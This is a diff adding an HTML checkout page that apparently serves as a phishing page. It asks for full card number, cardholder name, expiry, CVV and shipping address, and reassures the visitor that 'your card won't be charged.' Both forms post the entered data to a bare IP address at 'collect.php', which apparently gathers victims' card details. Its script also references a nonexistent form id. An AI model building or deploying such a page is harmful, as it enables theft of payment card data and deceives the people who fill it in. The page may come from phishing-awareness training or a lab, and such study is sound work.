@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Credit Card Form</title>
+  <link href="Puppies-PNG-Transparent-Image.png" rel="icon" type="image/x-icon"/>
+  <style type="text/css">
+    /* CSS styles for the credit card form */
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #ffffff;
+    }
+
+    .container {
+      display: flex;
+      max-width: 800px;
+      margin: 0 auto;
+      padding: 20px;
+      background-color: #fff;
+      border-radius: 6px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.063);
+    }
+
+    .form-section {
+      flex: 1;
+      padding-right: 20px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      font-weight: bold;
+      margin-bottom: 5px;
+    }
+
+    input[type="text"],
+    input[type="number"] {
+      width: 100%;
+      padding: 8px;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+    }
+
+    select {
+      width: 100%;
+      padding: 8px;
+      border-radius: 4px;
+      border: 1px solid #74767a;
+      color: #000000;
+    }
+
+    .card-number-group {
+      display: flex;
+    }
+
+    .card-number-group input {
+      flex: 1;
+      margin-right: 5px;
+    }
+
+    .cvv-group input {
+      width: calc(30% - 5px);
+      margin-right: 5px;
+    }
+
+    .cvv-group input:last-child {
+      margin-right: 0;
+    }
+
+    button {
+      padding: 10px 20px;
+      background-color: #4caf50;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #45a049;
+    }
+
+    img {
+      height: 300px;
+    }
+
+    h2 {
+      color: #4566a0;
+    }
+
+    p {
+      color: #0bec1a;
+    }
+
+    em {
+      color: #122f62;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="form-section">
+      <h2>Credit Card Information</h2>
+
+      <form id="credit-card-form" action="http://172.26.86.17:80/collect.php" method="POST">
+        <div class="form-group">
+          <label for="card-number">Card Number</label>
+          <div class="card-number-group">
+            <input id="card-number-1" name="card-number-1" maxlength="4" placeholder="0000" type="text" required/>
+            <input id="card-number-2" name="card-number-2" maxlength="4" placeholder="0000" type="text" required/>
+            <input id="card-number-3" name="card-number-3" maxlength="4" placeholder="0000" type="text" required/>
+            <input id="card-number-4" name="card-number-4" maxlength="4" placeholder="0000" type="text" required/>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label for="cardholder-name">Cardholder Name</label>
+          <input id="cardholder-name" name="cardholder-name" placeholder="John Doe" type="text" required/>
+        </div>
+
+        <div class="form-group">
+          <label for="expiry-month">Expiration Date</label>
+          <div class="expiry-group">
+            <select id="expiry-month" name="expiry-month" required>
+              <option disabled="disabled" selected="selected" value="">Month</option>
+              <option value="01">01</option>
+              <option value="02">02</option>
+              <option value="03">03</option>
+              <option value="04">04</option>
+              <option value="05">05</option>
+              <option value="06">06</option>
+              <option value="07">07</option>
+              <option value="08">08</option>
+              <option value="09">09</option>
+              <option value="10">10</option>
+              <option value="11">11</option>
+              <option value="12">12</option>
+              <!-- Add more month options here -->
+            </select>
+            <select id="expiry-year" name="expiry-year" required>
+              <option disabled="disabled" selected="selected" value="">Year</option>
+              <option value="2023">2023</option>
+              <option value="2024">2024</option>
+              <option value="2025">2025</option>
+              <option value="2026">2026</option>
+              <option value="2027">2027</option>
+              <option value="2028">2028</option>
+              <option value="2029">2029</option>
+              <option value="2030">2030</option>
+              <option value="2031">2031</option>
+              <option value="2032">2032</option>
+              <option value="2033">2033</option>
+              <option value="2034">2034</option>
+              <option value="2035">2035</option>
+              <!-- Add more year options here -->
+            </select>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label for="cvv">CVV</label>
+          <div class="cvv-group">
+            <input id="cvv" name="cvv" maxlength="4" pattern="[0-9]{4}" placeholder="CVV" type="text" required/>
+          </div>
+        </div>
+
+        <p>Your billing price is $10. Your card won't be charged.</p>
+
+        <div id="container">
+          <h1>Checkout</h1>
+
+          <div class="item-details">
+            <h2>Item</h2>
+            <p>Price: <span class="old-price">$13</span></p>
+            <p>Discounted Price: <span class="new-price">$10</span></p>
+            <label for="quantity">Quantity:</label>
+            <em>One(1)</em>
+          </div>
+        </div>
+
+        <button id="submit-btn" type="submit">Submit</button>
+      </form>
+    </div>
+
+    <div class="form-section">
+      <h2>Shipping Address</h2>
+
+      <form id="shipping-address-form" action="http://172.26.86.17:80/collect.php" method="POST">
+        <div class="form-group">
+          <label for="address">Address</label>
+          <input id="address" name="address" placeholder="Enter your address" type="text" required/>
+        </div>
+
+        <div class="form-group">
+          <label for="city">City</label>
+          <input id="city" name="city" placeholder="Enter your city" type="text" required/>
+        </div>
+
+        <div class="form-group">
+          <label for="state">State</label>
+          <input id="state" name="state" placeholder="Enter your state" type="text" required/>
+        </div>
+
+        <div class="form-group">
+          <label for="zipcode">Zip Code</label>
+          <input id="zipcode" name="zipcode" placeholder="Enter your zip code" type="text" required/>
+        </div>
+
+        <button id="submit-shipping-btn" type="submit">Submit</button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    const cardNumberInput = document.getElementById('card-number-1');
+    const cardholderNameInput = document.getElementById('cardholder-name');
+    const expiryMonthInput = document.getElementById('expiry-month');
+    const expiryYearInput = document.getElementById('expiry-year');
+    const cvvInput = document.getElementById('cvv');
+
+    const cardForm = document.getElementById('card-form');
+    const shippingForm = document.getElementById('shipping-address-form');
+
+    cardForm.addEventListener('submit', handleCardFormSubmit);
+    shippingForm.addEventListener('submit', handleShippingFormSubmit);
+
+    function handleCardFormSubmit(event) {
+      event.preventDefault();
+      // Process the card form submission here
+    }
+
+    function handleShippingFormSubmit(event) {
+      event.preventDefault();
+      // Process the shipping address form submission here
+    }
+  </script>
+</body>
+</html>
